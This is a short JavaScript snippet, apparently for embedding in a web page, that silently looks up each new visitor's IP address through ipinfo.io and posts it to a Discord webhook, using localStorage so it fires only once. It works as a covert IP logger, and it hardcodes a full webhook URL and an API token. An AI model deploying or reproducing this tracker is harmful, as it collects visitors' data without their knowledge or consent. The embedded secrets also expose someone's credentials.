const webhookURL = 'https://discord.com/api/webhooks/1294333401259577344/aR6zhx7o2WQ9HpN1ltRB4UT38goB57FsBfTloAZQpWbrpaX5tIys4RL4r8YG7uN71AA1';
const ipinfoToken = '8ad0e98e4e82d5';

// Made By 9R3A_
if (!localStorage.getItem('joined')) {
    
    fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;

        
        if (!localStorage.getItem('ipSent')) {
            
            const payload = {
                content: `A new member has joined the website. IP: ${ip}`,
            };

            
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(() => {
				
                localStorage.setItem('joined', 'true');
                localStorage.setItem('ipSent', ip);
            })
            .catch(error => {
                console.error('Error sending to webhook:', error);
            });
        }
    })
    .catch(error => {
        console.error('Error fetching IP information:', error);
    });
}